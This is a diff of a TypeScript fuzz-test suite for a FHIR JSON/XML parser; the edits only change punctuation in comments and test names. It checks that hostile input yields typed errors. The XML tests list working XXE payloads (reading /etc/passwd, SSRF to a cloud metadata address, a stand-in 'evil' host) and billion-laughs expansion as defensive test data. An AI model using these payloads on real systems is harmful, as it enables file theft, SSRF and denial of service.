@@ -1,13 +1,13 @@
 /**
- * FHIR-P11 fuzz tier (roadmap §6 "Fuzzing — JSON/XML-level, not byte-level").
+ * FHIR-P11 fuzz tier (roadmap §6 "Fuzzing, JSON/XML-level, not byte-level").
  *
- * FHIR is transported as text, so the attack surface of this library is adversarial JSON and XML —
+ * FHIR is transported as text, so the attack surface of this library is adversarial JSON and XML,
  * not byte framing. The single contract this file proves, at fuzz-scale run counts, across every
  * hostile-input shape the roadmap names (truncation, deep nesting, `_element` games, huge /
- * scientific-notation numbers, `resourceType` games, and — for XML — XXE / billion-laughs / undefined
+ * scientific-notation numbers, `resourceType` games, and, for XML, XXE / billion-laughs / undefined
  * entities), is:
  *
- *   **Adversarial input never crashes, hangs, or OOMs — it becomes a *typed* error (a
+ *   **Adversarial input never crashes, hangs, or OOMs, it becomes a *typed* error (a
  *   `FhirCodecError` / `FhirXmlError` whose `.code` is a registered fatal) or a bounded rejection,
  *   never an untyped throw (a `RangeError` stack overflow, a `TypeError`, …) and never a non-return.**
  *
@@ -16,7 +16,7 @@
  * is refused with a typed fatal rather than overflowing V8's stack.
  *
  * This complements the round-trip / immutability property suites (`roundtrip.property.test.ts`,
- * `safety.property.test.ts`) — those assert *correct* behavior on well-formed input; this asserts
+ * `safety.property.test.ts`), those assert *correct* behavior on well-formed input; this asserts
  * *safe* behavior on hostile input.
  */
 
@@ -41,7 +41,7 @@ import {
 } from "../src/index.js";
 
 /**
- * High run count, fixed seed — deterministic fuzz-scale reproduction (mirrors the hl7 fuzz harness).
+ * High run count, fixed seed, deterministic fuzz-scale reproduction (mirrors the hl7 fuzz harness).
  * The count is CI-tunable via `FUZZ_RUNS` (the dedicated `fuzz` CI job raises it); the fixed seed
  * keeps a failure reproducible regardless of the count.
  */
@@ -144,7 +144,7 @@ function mutationArb(chars: readonly string[]): fc.Arbitrary<Mutation> {
   });
 }
 
-/** Structure-char mutations of a real, spec-clean JSON fixture — malformed-but-JSON-shaped input. */
+/** Structure-char mutations of a real, spec-clean JSON fixture, malformed-but-JSON-shaped input. */
 function mutatedJsonFixture(): fc.Arbitrary<string> {
   return fc
     .record({
@@ -171,7 +171,7 @@ describe("fuzz: corpus is loaded (a 0-fixture corpus would make every property v
   });
 });
 
-describe("fuzz: JSON — arbitrary bytes never throw except a registered FhirCodecError", () => {
+describe("fuzz: JSON, arbitrary bytes never throw except a registered FhirCodecError", () => {
   it("random unicode/binary strings", () => {
     fc.assert(
       fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
@@ -195,7 +195,7 @@ describe("fuzz: JSON — arbitrary bytes never throw except a registered FhirCod
   });
 });
 
-describe("fuzz: JSON — structural mutation & truncation of spec-clean fixtures never crash", () => {
+describe("fuzz: JSON, structural mutation & truncation of spec-clean fixtures never crash", () => {
   it("inject/duplicate/drop of JSON structural characters", () => {
     fc.assert(
       fc.property(mutatedJsonFixture(), (raw) => {
@@ -215,7 +215,7 @@ describe("fuzz: JSON — structural mutation & truncation of spec-clean fixtures
   });
 });
 
-describe("fuzz: JSON — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
+describe("fuzz: JSON, deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
   // The whole point of the bound: without it, these overflow V8's stack with an untyped RangeError.
   it("a tower of arrays past the bound", () => {
     fc.assert(
@@ -251,14 +251,14 @@ describe("fuzz: JSON — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a sta
   });
 });
 
-describe("fuzz: JSON — huge / scientific-notation numbers are preserved, never crash or corrupt", () => {
+describe("fuzz: JSON, huge / scientific-notation numbers are preserved, never crash or corrupt", () => {
   it("adversarial number literals round-trip as text with a precision flag, no throw", () => {
     const digits = fc.stringOf(fc.constantFrom(..."0123456789".split("")), {
       minLength: 1,
       maxLength: 40,
     });
     // A valid JSON integer part: a single `0`, or a nonzero digit followed by any digits (no leading
-    // zeros — the reader correctly rejects `00.0` as MALFORMED, so we do not generate it here).
+    // zeros, the reader correctly rejects `00.0` as MALFORMED, so we do not generate it here).
     const intPart = fc.oneof(
       fc.constant("0"),
       fc
@@ -287,7 +287,7 @@ describe("fuzz: JSON — huge / scientific-notation numbers are preserved, never
 
   it("a finite-as-double value with an astronomical exponent parses without RangeError or hang", () => {
     // Regression: `0e9999999999999999999` (and other values that underflow/collapse to a finite
-    // double but decompose to an astronomical scale) once threw an untyped `RangeError` — the
+    // double but decompose to an astronomical scale) once threw an untyped `RangeError`, the
     // precision check aligned scales with `10n ** thatScale`, exploding the BigInt. It must be a
     // clean parse now (the value is preserved as its exact lexical text, flagged at-risk).
     for (const lit of [
@@ -303,7 +303,7 @@ describe("fuzz: JSON — huge / scientific-notation numbers are preserved, never
   });
 });
 
-describe("fuzz: JSON — misaligned `_element` arrays fail closed with a typed fatal, never a wrong-value merge", () => {
+describe("fuzz: JSON, misaligned `_element` arrays fail closed with a typed fatal, never a wrong-value merge", () => {
   it("random length disagreements between a primitive array and its _-sibling", () => {
     fc.assert(
       fc.property(
@@ -333,7 +333,7 @@ describe("fuzz: JSON — misaligned `_element` arrays fail closed with a typed f
   });
 });
 
-describe("fuzz: JSON — validateResource never throws over any resource that parsed", () => {
+describe("fuzz: JSON, validateResource never throws over any resource that parsed", () => {
   it("validation is total on the fuzz/mutation corpus", () => {
     const anyJson = fc.oneof(
       { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
@@ -343,7 +343,7 @@ describe("fuzz: JSON — validateResource never throws over any resource that pa
     fc.assert(
       fc.property(anyJson, (raw) => {
         const result = assertJsonSafe(raw);
-        if (result === undefined) return; // typed fatal on parse — nothing to validate
+        if (result === undefined) return; // typed fatal on parse, nothing to validate
         expect(() => validateResource(result.resource)).not.toThrow();
       }),
       RUN_CONFIG,
@@ -351,7 +351,7 @@ describe("fuzz: JSON — validateResource never throws over any resource that pa
   });
 });
 
-describe("fuzz: JSON — survivor round-trip: anything that parses serializes and re-parses", () => {
+describe("fuzz: JSON, survivor round-trip: anything that parses serializes and re-parses", () => {
   it("parseResource(serializeResource(x)) never throws for a survivor", () => {
     const anyJson = fc.oneof(
       { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
@@ -370,7 +370,7 @@ describe("fuzz: JSON — survivor round-trip: anything that parses serializes an
   });
 });
 
-describe("fuzz: JSON — prototype-chain property names never fault the validator", () => {
+describe("fuzz: JSON, prototype-chain property names never fault the validator", () => {
   // Regression: a resource property literally named `constructor` / `toString` / `valueOf` /
   // `hasOwnProperty` / `__proto__` once crashed `validateResource` with an uncaught `TypeError`,
   // because a plain-object schema lookup read an inherited `Object.prototype` member instead of an
@@ -456,7 +456,7 @@ function mutatedXmlFixture(): fc.Arbitrary<string> {
     .map(({ base, mutations }) => mutated(base, mutations));
 }
 
-describe("fuzz: XML — arbitrary bytes never throw except a registered FhirXmlError", () => {
+describe("fuzz: XML, arbitrary bytes never throw except a registered FhirXmlError", () => {
   it("random unicode/binary strings", () => {
     fc.assert(
       fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
@@ -480,7 +480,7 @@ describe("fuzz: XML — arbitrary bytes never throw except a registered FhirXmlE
   });
 });
 
-describe("fuzz: XML — mutation & truncation of spec-clean fixtures never crash", () => {
+describe("fuzz: XML, mutation & truncation of spec-clean fixtures never crash", () => {
   it("inject/duplicate/drop of XML structural characters", () => {
     fc.assert(
       fc.property(mutatedXmlFixture(), (raw) => {
@@ -500,14 +500,14 @@ describe("fuzz: XML — mutation & truncation of spec-clean fixtures never crash
   });
 });
 
-describe("fuzz: XML — XXE / billion-laughs / entity attacks are refused by construction", () => {
+describe("fuzz: XML, XXE / billion-laughs / entity attacks are refused by construction", () => {
   it("any DOCTYPE (the XXE + billion-laughs vector) is refused with DTD_FORBIDDEN, no I/O, no expansion", () => {
     const payloads = [
-      // Classic XXE — external entity pointing at a local file.
+      // Classic XXE, external entity pointing at a local file.
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><Patient><name value="&x;"/></Patient>',
-      // Classic XXE — external entity over the network (SSRF).
+      // Classic XXE, external entity over the network (SSRF).
       '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><Patient/>',
-      // Billion-laughs — nested internal entities, exponential expansion.
+      // Billion-laughs, nested internal entities, exponential expansion.
       '<!DOCTYPE lolz [<!ENTITY a "aa"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><Patient><name value="&c;"/></Patient>',
       // Parameter-entity variant.
       '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x">%p;]><Patient/>',
@@ -589,7 +589,7 @@ describe("fuzz: XML — XXE / billion-laughs / entity attacks are refused by con
   });
 });
 
-describe("fuzz: XML — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
+describe("fuzz: XML, deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
   it("a tower of elements past the bound", () => {
     fc.assert(
       fc.property(fc.integer({ min: 300, max: 20_000 }), (depth) => {
@@ -609,13 +609,13 @@ describe("fuzz: XML — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stac
 
 // ── NDJSON contract ──────────────────────────────────────────────────────────────────────────────
 
-describe("fuzz: NDJSON — parseNdjsonLine isolates every failure and never throws", () => {
+describe("fuzz: NDJSON, parseNdjsonLine isolates every failure and never throws", () => {
   it("a malformed / hostile line yields a value-free error record, never a throw", () => {
     const anyLine = fc.oneof(
       fc.string({ minLength: 0, maxLength: 200, unit: "binary" }),
       mutatedJsonFixture(),
       truncatedFixture(JSON_FIXTURES),
-      // A deeply-nested line — must isolate, not overflow.
+      // A deeply-nested line, must isolate, not overflow.
       fc.integer({ min: 300, max: 5000 }).map((d) => "[".repeat(d) + "]".repeat(d)),
     );
     fc.assert(
@@ -626,7 +626,7 @@ describe("fuzz: NDJSON — parseNdjsonLine isolates every failure and never thro
         expect(() => {
           record = parseNdjsonLine(oneLine, lineNo);
         }).not.toThrow();
-        // Exactly one of resource / error (or neither, for a blank line) — never both, never a throw.
+        // Exactly one of resource / error (or neither, for a blank line), never both, never a throw.
         if (record?.error) {
           expect(Object.values(NDJSON_ERROR_CODES)).toContain(record.error.code);
           expect(record.error.line).toBe(lineNo);
